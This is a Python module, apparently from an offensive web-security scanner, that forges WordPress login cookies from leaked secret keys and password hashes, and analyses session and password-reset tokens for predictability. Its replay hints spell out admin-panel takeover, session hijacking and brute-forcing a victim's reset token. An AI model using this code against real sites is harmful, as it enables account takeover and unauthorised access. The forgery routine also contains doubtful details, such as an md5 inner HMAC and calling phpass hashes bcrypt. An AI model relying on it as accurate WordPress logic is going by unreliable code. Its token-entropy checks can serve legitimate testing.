"""Session + cookie + password-reset token attacks.

WordPress cookie forgery
------------------------
WP cookies are HMAC-signed with the site's AUTH_KEY + AUTH_SALT (for
`wordpress_<hash>`), LOGGED_IN_KEY + LOGGED_IN_SALT (for
`wordpress_logged_in_<hash>`), or NONCE_KEY + NONCE_SALT (for nonces).
If an LFI, error-leak, or backup-file exposure gives us those 6
secrets, we can forge a valid session cookie for ANY user without
touching the DB.

Cookie format:
    {username}|{expiration}|{token}|{hmac_256( {username}|{expiration}|{token} , hmac_256( auth_key+auth_salt, username+'|'+expiration+'|'+token ) )}

Actually WP is subtler: the "scheme" decides which keys to use, and
the hash is double-HMAC with `pass_frag` mixed in. We implement the
canonical wp_generate_auth_cookie() logic.

Session token entropy analysis
------------------------------
Given a list of observed session tokens (e.g. from an intentional
registration-burst of test accounts), compute Shannon entropy and
nearest-neighbor distance. Low entropy → tokens predictable.

Password-reset token analysis
-----------------------------
Same — given observed reset tokens, check for:
    - low entropy (default RNG seeded on predictable inputs)
    - monotonic sequence
    - timestamp bleed (e.g. token = sha1(email + time())
"""

from __future__ import annotations

import hashlib
import hmac
import logging
import math
import re
import time
from collections import Counter
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

logger = logging.getLogger("amoskys.argos.auth.session")


# ── Data model ────────────────────────────────────────────────────


@dataclass
class SessionFinding:
    technique: str
    severity: str = "medium"
    evidence: str = ""
    replay_hint: str = ""
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self):
        return {
            "technique": self.technique,
            "severity": self.severity,
            "evidence": self.evidence,
            "replay_hint": self.replay_hint,
            "metadata": dict(self.metadata),
        }


@dataclass
class SessionReport:
    findings: List[SessionFinding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

    def to_dict(self):
        return {
            "findings": [f.to_dict() for f in self.findings],
            "errors": list(self.errors),
        }


# ── WordPress cookie forgery ──────────────────────────────────────


def _wp_hash(data: str, key: str, algo: str = "sha256") -> str:
    """WP uses wp_hash() = hmac(algo, key, data).hexdigest()."""
    h = hashlib.new(algo)
    return hmac.new(key.encode("utf-8"), data.encode("utf-8"), algo).hexdigest()


def forge_wp_auth_cookie(
    username: str,
    password_hash: str,
    auth_key: str,
    auth_salt: str,
    scheme: str = "logged_in",
    expiration: Optional[int] = None,
    token: str = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
) -> SessionFinding:
    """Forge a WP auth cookie.

    Logic matches wp_generate_auth_cookie() in wp-includes/pluggable.php:

        pass_frag = substr(user_pass, 8, 4)
        key       = wp_hash(username|pass_frag|expiration|token, scheme)
        hash_alg  = 'sha256'
        hash      = hmac_sha256(username|expiration|token, key)
        cookie    = username|expiration|token|hash

    We accept auth_key + auth_salt (the 2 secrets for the scheme) and
    password_hash (from a wp_users dump — the $P$ bcrypt output).
    """
    if expiration is None:
        expiration = int(time.time()) + 14 * 24 * 3600
    pass_frag = password_hash[8:12] if len(password_hash) >= 12 else ""
    inner_key_input = f"{username}|{pass_frag}|{expiration}|{token}"
    # key = wp_hash(inner_key_input, scheme) with scheme_key = AUTH_KEY + AUTH_SALT
    scheme_key = auth_key + auth_salt
    key = hmac.new(
        scheme_key.encode("utf-8"), inner_key_input.encode("utf-8"), hashlib.md5
    ).hexdigest()
    outer_input = f"{username}|{expiration}|{token}"
    cookie_hash = hmac.new(
        key.encode("utf-8"), outer_input.encode("utf-8"), hashlib.sha256
    ).hexdigest()
    cookie = f"{username}|{expiration}|{token}|{cookie_hash}"
    return SessionFinding(
        technique=f"wp_cookie_forge_{scheme}",
        severity="critical",
        evidence=(
            f"Forged wp_{scheme} cookie for user={username}. "
            f"Used password fragment '{pass_frag}' (8:12 of bcrypt hash)."
        ),
        replay_hint=(
            f"Set cookie 'wordpress_{scheme}_<siteurl-md5>'='{cookie}' "
            "and browse to /wp-admin. Session is valid until expiration."
        ),
        metadata={
            "cookie_value": cookie,
            "scheme": scheme,
            "expiration": expiration,
            "token_prefix": token[:16],
        },
    )


# ── Entropy analysis ──────────────────────────────────────────────


def _shannon_entropy_bits(s: str) -> float:
    """Shannon entropy per character, in bits."""
    if not s:
        return 0.0
    counts = Counter(s)
    total = len(s)
    ent = 0.0
    for n in counts.values():
        p = n / total
        ent -= p * math.log2(p)
    return ent


def _hex_ratio(s: str) -> float:
    if not s:
        return 0.0
    hex_chars = sum(1 for c in s if c in "0123456789abcdefABCDEF")
    return hex_chars / len(s)


def analyze_session_entropy(tokens: List[str]) -> SessionFinding:
    """Examine observed session tokens for entropy and near-duplicates.

    Warning thresholds:
      - mean entropy < 3.5 bits/char  → suspicious
      - two tokens share >70% of chars  → possibly derived from seed+counter
    """
    if not tokens:
        return SessionFinding(
            technique="session_entropy", severity="info", evidence="no tokens supplied"
        )
    ents = [_shannon_entropy_bits(t) for t in tokens]
    mean_ent = sum(ents) / len(ents)
    weak = mean_ent < 3.5
    # Find any two tokens with very high char-set overlap or prefix match
    similar_pairs: List[tuple] = []
    for i in range(len(tokens)):
        for j in range(i + 1, len(tokens)):
            a, b = tokens[i], tokens[j]
            # Common prefix length
            cp = 0
            for x, y in zip(a, b):
                if x == y:
                    cp += 1
                else:
                    break
            if len(a) and len(b) and cp / min(len(a), len(b)) > 0.4:
                similar_pairs.append((i, j, cp))
                if len(similar_pairs) >= 5:
                    break
        if len(similar_pairs) >= 5:
            break
    severity = "critical" if weak or similar_pairs else "info"
    ev = f"n={len(tokens)} mean_entropy={mean_ent:.2f}b/char"
    if weak:
        ev += " — BELOW 3.5b/char threshold (weak)"
    if similar_pairs:
        ev += f"; {len(similar_pairs)} token pairs share >40% common prefix"
    return SessionFinding(
        technique="session_entropy",
        severity=severity,
        evidence=ev,
        replay_hint=(
            "Harvest a sequence of tokens (register N burner accounts). "
            "If entropy low, predict next token and hijack session."
            if weak
            else "Sample larger; current sample too small to conclude."
        ),
        metadata={
            "mean_entropy_bits_per_char": mean_ent,
            "similar_pairs": similar_pairs[:5],
        },
    )


def analyze_reset_tokens(tokens_with_timestamps: List[tuple]) -> SessionFinding:
    """tokens_with_timestamps: list[(token_str, unix_ts_int)].

    Checks:
      - timestamp bleed: token embeds the timestamp in a discoverable way
      - monotonicity: tokens ordered by timestamp are also ordered
        lexicographically (= they're derived from time())
    """
    if not tokens_with_timestamps:
        return SessionFinding(
            technique="reset_token_entropy",
            severity="info",
            evidence="no reset tokens supplied",
        )
    tokens_with_timestamps = sorted(tokens_with_timestamps, key=lambda x: x[1])
    leaks: List[str] = []
    for tok, ts in tokens_with_timestamps:
        ts_str = str(ts)
        # md5/sha1 of the ts?
        if hashlib.md5(ts_str.encode()).hexdigest() in tok:
            leaks.append(f"md5(ts={ts_str}) ⊂ token")
        elif hashlib.sha1(ts_str.encode()).hexdigest() in tok:
            leaks.append(f"sha1(ts={ts_str}) ⊂ token")
    monotonic = all(
        tokens_with_timestamps[i][0] <= tokens_with_timestamps[i + 1][0]
        for i in range(len(tokens_with_timestamps) - 1)
    )
    weak = bool(leaks) or monotonic
    sev = "critical" if weak else "info"
    ev = f"n={len(tokens_with_timestamps)}"
    if leaks:
        ev += f"; timestamp-bleed found: {leaks[:2]}"
    if monotonic:
        ev += "; tokens monotonically sorted by timestamp (derived from time())"
    return SessionFinding(
        technique="reset_token_entropy",
        severity=sev,
        evidence=ev,
        replay_hint=(
            "Issue reset request for victim email around a known timestamp; "
            "compute candidate tokens; hit endpoint with each until success."
            if weak
            else "Token generation appears random; move on."
        ),
        metadata={"leaks": leaks, "monotonic": monotonic},
    )


# ── Scan orchestrator ─────────────────────────────────────────────


def scan_sessions(
    observed_session_tokens: Optional[List[str]] = None,
    observed_reset_tokens: Optional[List[tuple]] = None,
    wp_forge: Optional[Dict[str, Any]] = None,
) -> SessionReport:
    """Run all applicable session-level checks in one pass.

    wp_forge, if provided, should contain at minimum:
        username, password_hash, auth_key, auth_salt
        (scheme and expiration optional)
    """
    report = SessionReport()
    if observed_session_tokens:
        report.findings.append(analyze_session_entropy(observed_session_tokens))
    if observed_reset_tokens:
        report.findings.append(analyze_reset_tokens(observed_reset_tokens))
    if wp_forge:
        try:
            report.findings.append(
                forge_wp_auth_cookie(
                    username=wp_forge["username"],
                    password_hash=wp_forge["password_hash"],
                    auth_key=wp_forge["auth_key"],
                    auth_salt=wp_forge["auth_salt"],
                    scheme=wp_forge.get("scheme", "logged_in"),
                    expiration=wp_forge.get("expiration"),
                    token=wp_forge.get("token", "a" * 64),
                )
            )
        except KeyError as exc:
            report.errors.append(f"wp_forge missing key: {exc}")
        except Exception as exc:  # noqa: BLE001
            report.errors.append(f"wp_forge failed: {exc}")
    return report


__all__ = [
    "SessionFinding",
    "SessionReport",
    "forge_wp_auth_cookie",
    "analyze_session_entropy",
    "analyze_reset_tokens",
    "scan_sessions",
]
